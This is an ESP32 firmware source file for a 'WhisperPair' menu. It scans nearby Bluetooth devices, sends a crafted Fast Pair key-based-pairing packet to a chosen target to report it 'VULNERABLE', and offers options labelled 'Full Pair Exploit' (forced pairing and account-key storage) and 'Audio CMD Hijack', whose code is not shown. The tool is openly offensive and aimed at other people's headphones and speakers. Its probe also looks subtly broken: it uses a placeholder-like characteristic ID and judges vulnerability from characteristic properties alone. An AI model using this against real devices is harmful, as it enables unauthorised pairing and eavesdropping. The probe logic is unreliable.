#include "whisperpair.h"
#include "whisperpair_audio.h"
#include <globals.h>
#include "core/display.h"

#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#endif

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;
    
    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        initialized = true;
    }
    
    return true;
}

void updateScanDisplay(uint32_t foundCount, uint32_t elapsedMs, bool forceRedraw) {
    static uint32_t lastFound = 0;
    static uint32_t lastTime = 0;
    static uint32_t lastUpdate = 0;
    uint32_t now = millis();
    
    if(!forceRedraw && (now - lastUpdate < 250)) return;
    lastUpdate = now;
    
    if(forceRedraw || foundCount != lastFound) {
        tft.fillRect(20, 60, 200, 20, bruceConfig.bgColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.print("Found: " + String(foundCount));
        lastFound = foundCount;
    }
    
    uint32_t elapsedSeconds = elapsedMs / 1000;
    if(forceRedraw || elapsedSeconds != lastTime) {
        tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 80);
        tft.print("Time: " + String(elapsedSeconds) + "s");
        lastTime = elapsedSeconds;
    }
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print(message);
    tft.setCursor(20, 100);
    tft.print("Press SEL to confirm");
    tft.setCursor(20, 120);
    tft.print("or ESC to cancel");
    while(true) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", TFT_WHITE);
            delay(500);
            return false;
        }
        if(check(SelPress)) {
            displayMessage("Confirmed!", "", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);
    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);
    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
        delay(100);
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
            return false;
        }
    }
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

String selectTargetFromScan(const char* title) {
    struct BLE_Device {
        std::string address;
        std::string name;
        int rssi;
    };
    std::vector<BLE_Device> foundDevices;
    
    if(!NimBLEDevice::getInitialized()) {
        NimBLEDevice::init("");
    }
    
    NimBLEScan* pScan = NimBLEDevice::getScan();
    if (!pScan) {
        displayMessage("Scanner init failed", "OK", "", "", TFT_RED);
        return "";
    }
    
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    
    tft.setCursor(20, 60);
    tft.print("Scanning... 30s");
    tft.setCursor(20, 80);
    tft.print("Found: 0");
    tft.setCursor(20, 100);
    tft.print("Press ESC to stop");
    
    tft.fillRect(20, 140, tftWidth - 40, 10, TFT_DARKGREY);
    
    uint32_t scanStartTime = millis();
    bool scanStopped = false;
    
    pScan->start(30, false);
    
    while(millis() - scanStartTime < 30000 && !scanStopped) {
        uint32_t elapsed = millis() - scanStartTime;
        int barWidth = tftWidth - 40;
        int progress = (elapsed * barWidth) / 30000;
        
        tft.fillRect(20, 140, barWidth, 10, TFT_DARKGREY);
        tft.fillRect(20, 140, progress, 10, TFT_GREEN);
        
        if(check(EscPress)) {
            pScan->stop();
            scanStopped = true;
            break;
        }
        
        delay(100);
    }
    
    NimBLEScanResults results = pScan->getResults();
    pScan->clearResults();
    
    int deviceCount = results.getCount();
    for(int i = 0; i < deviceCount; i++) {
        const NimBLEAdvertisedDevice* device = results.getDevice(i);
        if(!device) continue;
        
        BLE_Device dev;
        dev.address = device->getAddress().toString();
        dev.name = device->getName();
        if(dev.name.empty()) dev.name = "<no name>";
        dev.rssi = device->getRSSI();
        
        foundDevices.push_back(dev);
    }
    
    tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
    tft.setCursor(20, 80);
    tft.print("Found: " + String(foundDevices.size()));
    
    if(foundDevices.empty()) {
        displayMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
        delay(1500);
        return "";
    }
    
    std::sort(foundDevices.begin(), foundDevices.end(), 
        [](const BLE_Device& a, const BLE_Device& b) {
            return a.rssi > b.rssi;
        });
    
    int currentIndex = 0;
    bool redraw = true;
    String selectedMAC = "";
    
    while(selectedMAC.isEmpty()) {
        if(check(EscPress)) break;
        
        if(redraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SELECT DEVICE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            
            tft.setCursor(20, 50);
            tft.print("Found: " + String(foundDevices.size()));
            
            tft.setCursor(20, 70);
            tft.print("Device " + String(currentIndex + 1) + "/" + String(foundDevices.size()));
            
            if(currentIndex < foundDevices.size()) {
                BLE_Device& dev = foundDevices[currentIndex];
                
                tft.setCursor(20, 100);
                tft.print("Name: " + String(dev.name.c_str()));
                
                tft.setCursor(20, 120);
                tft.print("MAC: " + String(dev.address.c_str()));
                
                tft.setCursor(20, 140);
                tft.print("RSSI: " + String(dev.rssi) + " dBm");
            }
            
            tft.setCursor(20, 180);
            tft.print("PREV/NEXT: Navigate");
            
            tft.setCursor(20, 200);
            tft.print("SEL: Select device");
            
            tft.setCursor(20, 220);
            tft.print("ESC: Cancel");
            
            redraw = false;
        }
        
        delay(50);
        
        if(check(PrevPress)) {
            if(currentIndex > 0) {
                currentIndex--;
                redraw = true;
            }
        } else if(check(NextPress)) {
            if(currentIndex < foundDevices.size() - 1) {
                currentIndex++;
                redraw = true;
            }
        } else if(check(SelPress)) {
            if(currentIndex < foundDevices.size()) {
                selectedMAC = String(foundDevices[currentIndex].address.c_str());
            }
        }
    }
    
    return selectedMAC;
}

void testFastPairVulnerability() {
    initBLEIfNeeded();
    
    String selectedMAC = selectTargetFromScan("SELECT TARGET");
    if(selectedMAC.isEmpty()) return;
    
    NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
    
    if(!requireSimpleConfirmation("Test vulnerability?")) return;
    
    bool vulnerable = attemptKeyBasedPairing(target);
    
    delay(2000);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[Scan & Test]", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[Full Pair Test]", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(1);
        
        int lineHeight = 18;
        int startY = 50;
        
        tft.setCursor(20, startY);
        tft.print("This will attempt full pairing:");
        
        tft.setCursor(20, startY + lineHeight);
        tft.print("1. Connect to target");
        
        tft.setCursor(20, startY + (lineHeight * 2));
        tft.print("2. ECDH key exchange");
        
        tft.setCursor(20, startY + (lineHeight * 3));
        tft.print("3. Complete pairing");
        
        tft.setCursor(20, startY + (lineHeight * 4));
        tft.print("4. Store account key");
        
        String prompt = "Press SEL to continue - ESC to cancel";
        int textWidth = prompt.length() * 6;
        int centerX = (tftWidth - textWidth) / 2;
        if (centerX < 20) centerX = 20;
        tft.setCursor(centerX, startY + (lineHeight * 5));
        tft.print(prompt);
        
        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }
        String selectedMAC = selectTargetFromScan("SELECT TARGET");
        if(selectedMAC.isEmpty()) return;
        NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;
        bool success = whisperPairFullExploit(target);
        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
        } else {
            displayMessage("Exploit failed", "OK", "", "", TFT_RED);
        }
    }});

    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[Back]", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}